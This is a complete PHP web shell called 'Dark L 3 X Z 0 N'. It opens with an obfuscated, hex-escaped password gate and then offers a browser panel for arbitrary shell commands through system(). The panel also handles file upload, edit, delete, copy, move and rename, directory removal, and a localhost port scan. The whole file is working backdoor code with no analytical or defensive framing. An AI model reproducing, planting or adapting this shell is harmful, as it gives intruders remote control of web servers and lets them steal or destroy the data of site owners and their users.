<?php ${"G\x4cO\x42\x41L\x53"}["u\x76r\x72e\x75m\x62\x6ag\x62o\x76p\x66n\x65\x67\x61\x6e"]="p\x61s\x73";${"\x47\x4c\x4f\x42A\x4c\x53"}["\x6d\x7aq\x6d\x65\x69g\x6a\x6a\x70\x6dg\x6a_\x6ed\x67o\x74f\x62\x6cj\x62\x6d\x69\x71j\x6e\x78\x65_\x62y\x73e"]="_\x50\x4fS\x54";${"\x47L\x4fB\x41L\x53"}["\x67\x6az\x64\x6b\x71m\x68\x6eu\x64b\x78k\x65\x62y\x74o\x61f\x75\x67v\x78\x6en"]="\x63\x68\x6b\x5fl\x6f\x67\x69n";${"\x47L\x4fB\x41\x4cS"}["s\x70\x7az\x6c_\x70w\x6do\x66\x62\x69\x77v\x64k\x6az\x62k\x6b\x70z\x74\x77t\x6e\x75\x65f"]="\x70\x61\x73\x73w\x6f\x72\x64";${"G\x4cO\x42\x41L\x53"}["z\x76x\x69x\x79u\x6fc\x6eu\x66\x66o\x67u\x5f\x73y\x5fz\x66\x7ac\x71k\x75d\x64\x68c\x6ej\x63q\x79"]="_\x53E\x53S\x49O\x4e";${"\x47L\x4fB\x41L\x53"}["m\x6db\x6dv\x6b\x7a\x70x\x6e\x79d\x6ae\x74\x63\x68\x6b\x75w\x66\x63a\x6dy\x76n\x79\x6a\x76\x65_\x67h"]="_\x53E\x52\x56E\x52";session_start();set_time_limit(0);error_reporting(0);${${"G\x4cO\x42A\x4cS"}["u\x76r\x72e\x75m\x62\x6ag\x62o\x76p\x66n\x65\x67\x61\x6e"]}=${${"G\x4cO\x42A\x4cS"}["\x6d\x7aq\x6d\x65\x69g\x6a\x6a\x70\x6dg\x6a_\x6ed\x67o\x74f\x62\x6cj\x62\x6d\x69\x71j\x6e\x78\x65_\x62y\x73e"]}['pass'];${${"G\x4cO\x42\x41L\x53"}["\x67\x6az\x64\x6b\x71m\x68\x6eu\x64b\x78k\x65\x62y\x74o\x61f\x75\x67v\x78\x6en"]}=true;${${"\x47L\x4f\x42A\x4cS"}["s\x70\x7az\x6c_\x70w\x6do\x66\x62\x69\x77v\x64k\x6az\x62k\x6b\x70z\x74\x77t\x6e\x75\x65f"]}=" ";if(${${"\x47L\x4fB\x41L\x53"}["u\x76r\x72e\x75m\x62\x6ag\x62o\x76p\x66n\x65\x67\x61\x6e"]}==${${"G\x4cO\x42\x41\x4cS"}["s\x70\x7az\x6c_\x70w\x6do\x66\x62\x69\x77v\x64k\x6az\x62k\x6b\x70z\x74\x77t\x6e\x75\x65f"]}){${${"\x47\x4c\x4fB\x41L\x53"}["z\x76x\x69x\x79u\x6fc\x6eu\x66\x66o\x67u\x5f\x73y\x5fz\x66\x7ac\x71k\x75d\x64\x68c\x6ej\x63q\x79"]}['nst']="${${"\x47\x4cO\x42A\x4c\x53"}["u\x76r\x72e\x75m\x62\x6ag\x62o\x76p\x66n\x65\x67\x61\x6e"]}";}if(${${"G\x4cO\x42\x41\x4c\x53"}["\x67\x6az\x64\x6b\x71m\x68\x6eu\x64b\x78k\x65\x62y\x74o\x61f\x75\x67v\x78\x6en"]}==true){if(!isset(${${"\x47L\x4fB\x41L\x53"}["z\x76x\x69x\x79u\x6fc\x6eu\x66\x66o\x67u\x5f\x73y\x5fz\x66\x7ac\x71k\x75d\x64\x68c\x6ej\x63q\x79"]}['nst'])or ${${"\x47L\x4f\x42\x41L\x53"}["z\x76x\x69x\x79u\x6fc\x6eu\x66\x66o\x67u\x5f\x73y\x5fz\x66\x7ac\x71k\x75d\x64\x68c\x6ej\x63q\x79"]}['nst']!=${${"\x47L\x4fB\x41\x4cS"}["s\x70\x7az\x6c_\x70w\x6do\x66\x62\x69\x77v\x64k\x6az\x62k\x6b\x70z\x74\x77t\x6e\x75\x65f"]}){die("
  <table border=0 cellpadding=0 cellspacing=0 width=100% height=100%>
  <tr><td valign=middle align=center>
  <table width=200 bgcolor=#FFFFFF border=6 bordercolor=#FFFFFF>
  <form method=post>
  <font size=1 face=verdana color=red><strong><center>Host</strong></center>
  <input type=password name=pass size=30>
  </form><br>
  <b>Host:</b> ".${${"\x47\x4cO\x42A\x4c\x53"}["m\x6db\x6dv\x6b\x7a\x70x\x6e\x79d\x6ae\x74\x63\x68\x6b\x75w\x66\x63a\x6dy\x76n\x79\x6a\x76\x65_\x67h"]}["HTTP_HOST"]."\x3cb\x72\x3e
\xa \x20\x3cb\x3eI\x50\x3a<\x2f\x62>\x20".gethostbyname(${${"\x47\x4cO\x42A\x4c\x53"}["m\x6db\x6dv\x6b\x7a\x70x\x6e\x79d\x6ae\x74\x63\x68\x6b\x75w\x66\x63a\x6dy\x76n\x79\x6a\x76\x65_\x67h"]}["HTTP_HOST"])."\x3c\x62r\x3e
\xa \x20<\x2ft\x64\x3e\x3c/\x74\x72>\x3c/\x74\x61b\x6c\x65>\xd
\x20 ");
}
} 
error_reporting(0);
if (empty ($_GET ['dir'])){
$dir = getcwd ();
}
else {
$dir = $_GET ['dir'];
}
chdir ($dir);
$current = htmlentities ($_SERVER ['PHP_SELF'] . "?dir=" . $dir);

echo "<center><h1>Dark L 3 X Z 0 N</h1></center><p><hr><p>";
echo "<i>Server: " . $_SERVER ['SERVER_NAME'] . "<br>";
echo "Current directory: " . getcwd () . "<br>";
echo "Software: " . $_SERVER ['SERVER_SOFTWARE'] . "<pre></pre></i>";
echo "<pre></pre>";

echo "<table width = 50%>";
echo "<tr>";
echo "<td><a href = '".$current."&mode=system'>Shell Command</a></td>";
echo "<td><a href = '".$current."&mode=create'>Create a new file</a></td>";
echo "<td><a href = '".$current."&mode=upload'>Upload file</a></td>";
echo "<td><a href = '".$current."&mode=port_scan'>Port Scan</a></td>";
echo "</tr></table>";
echo "<pre></pre>";



$mode = $_GET ['mode'];
switch ($mode){
case 'edit':
$file = $_GET ['file'];
$new = $_POST ['new'];
if (empty ($new)){
$fp = fopen ($file, "r");
$file_cont = fread ($fp, filesize ($file));
$file_cont = str_replace ("</textarea>", "<textarea>", $file_cont);
echo "<form action = '".$current."&mode=edit&file=".$file."' method = 'POST'>";
echo "File: ". $file . "<br>";
echo "<textarea name = 'new' rows = '30' cols = '50'>".$file_cont."</textarea><br>";
echo "<input type = 'submit' value = 'Edit'></form>";
}
else {
$fp = fopen ($file, "w");
if (fwrite ($fp, $new)){
echo $file . " edited.<p>";
}
else {
echo "Unable to edit " . $file . ".<p>";
}
}
fclose ($fp);
break;
case 'delete':
$file = $_GET ['file'];
if (unlink ($file)){
echo $file . " deleted successfully.<p>";
}
else {
echo "Unable to delete " . $file . ".<p>";
}
break;
case 'copy':
$src = $_GET ['src'];
$dst = $_POST ['dst'];
if (empty ($dst)){
echo "<form action = '".$current . "&mode=copy&src=" . $src . "' method = 'POST'>";
echo "Destination: <input name = 'dst'><br>";
echo "<input type = 'submit' value = 'Copy'></form>";
}
else {
if (copy ($src, $dst)){
echo "File copied successfully.<p>";
}
else {
echo "Unable to copy " . $src . ".<p>";
}
}
break;
case 'move':
$src = $_GET ['src'];
$dst = $_POST ['dst'];
if (empty ($dst)){
echo "<form action = '".$current . "&mode=move&src=" . $src . "' method = 'POST'>";
echo "Destination: <input name = 'dst'><br>";
echo "<input type = 'submit' value = 'Move'></form>";
}
else {
if (rename ($src, $dst)){
echo "File moved successfully.<p>";
}
else {
echo "Unable to move " . $src . ".<p>";
}
}
break;
case 'rename':
$old = $_GET ['old'];
$new = $_POST ['new'];
if (empty ($new)){
echo "<form action = '".$current . "&mode=rename&old=" . $old . "' method = 'POST'>";
echo "New name: <input name = 'new'><br>";
echo "<input type = 'submit' value = 'Rename'></form>";
}
else {
if (rename ($old, $new)){
echo "File/Directory renamed successfully.<p>";
}
else {
echo "Unable to rename " . $old . ".<p>";
}
}
break;

case 'rmdir':
$rm = $_GET ['rm'];
if (rmdir ($rm)){
echo "Directory removed successfully.<p>";
}
else {
echo "Unable to remove " . $rm . ".<p>";
}
break;
case 'system':
$cmd = $_POST ['cmd'];
if (empty ($cmd)){
echo "<form action = '".$current . "&mode=system' method = 'POST'>";
echo "Shell Command: <input name = 'cmd'>";
echo "<input type = 'submit' value = 'Run'></form><p>";
}
else {
system ($cmd);
}
break;
case 'create':
$new = $_POST ['new'];
if (empty ($new)){
echo "<form action = '".$current . "&mode=create' method = 'POST'>";
echo "<tr><td>ew file: <input name = 'new'></td>";
echo "<td><input type = 'submit' value = 'Create'></td></tr></form><p>";
}
else {
if ($fp = fopen ($new, "w")){
echo "File created successfully.<p>";
}
else {
echo "Unable to create ".$file.".<p>";
}
fclose ($fp);
}
break;
case 'upload':
$temp = $_FILES['upload_file']['tmp_name'];
$file = basename($_FILES['upload_file']['name']);
if (empty ($file)){
echo "<form action = '".$current . "&mode=upload' method = 'POST' ENCTYPE='multipart/form-data'>";
echo "Local file: <input type = 'file' name = 'upload_file'>";
echo "<input type = 'submit' value = 'Upload'>";
echo "</form><pre></pre>";
}
else {
if(move_uploaded_file($temp,$file)){
echo "File uploaded successfully.<p>";
unlink ($temp);
}
else {
echo "Unable to upload " . $file . ".<p>";
}
}
break;

case 'port_scan':
$port_range = $_POST ['port_range'];
if (empty ($port_range)){
echo "<table><form action = '".$current. "&mode=port_scan' method = 'POST'>";
echo "<tr><td><input type = 'text' name = 'port_range'></td><td>";
echo "Enter port range where you want to do port scan (ex.: 0:65535)</td></tr>";
echo "<tr><td><input type = 'submit' value = 'Port Scan'></td></tr></form></table>";
}
else {
$range = explode (":", $port_range);
if ((!is_numeric ($range [0])) or (!is_numeric ($range [1]))){
echo "Bad parameters.<br>";
}
else {
$host = 'localhost';
$from = $range [0];
$to = $range [1];
echo "Open ports:<br>";
while ($from <= $to){
$var = 0;
$fp = fsockopen ($host, $from) or $var = 1;
if ($var == 0){
echo $from . "<br>";
}
$from++;
fclose ($fp);
}
}
}
break;


}

clearstatcache ();

echo "<pre></pre>";
echo "<table width = 100%>";
$files = scandir ($dir);
foreach ($files as $file){
if (is_file ($file)){

$size = round (filesize ($file) / 1024, 2);
echo "<tr><td>".$file."</td>";
echo "<td>".$size." KB</td>";
echo "<td><a href = ".$current . "&mode=edit&file=".$file.">Edit</a></td>";
echo "<td><a href = ".$current . "&mode=delete&file=".$file.">Delete</a></td>";
echo "<td><a href = ".$current . "&mode=copy&src=".$file.">Copy</a></td>";
echo "<td><a href = ".$current . "&mode=move&src=".$file.">Move</a></td>";
echo "<td><a href = ".$current . "&mode=rename&old=".$file.">Remame</a></td></tr>";
}
else {
$items = scandir ($file);
$items_num = count ($items) - 2;
echo "<tr><td>".$file."</td>";
echo "<td>".$items_num." Items</td>";
echo "<td><a href = ".$current . "/" . $file.">Change directory</a></td>";
echo "<td><a href = ".$current . "&mode=rmdir&rm=".$file.">Remove directory</a></td>";
echo "<td><a href = ".$current . "&mode=rename&old=".$file.">Rename directory</a></td></tr>";
}
}
echo "</table>";
?>
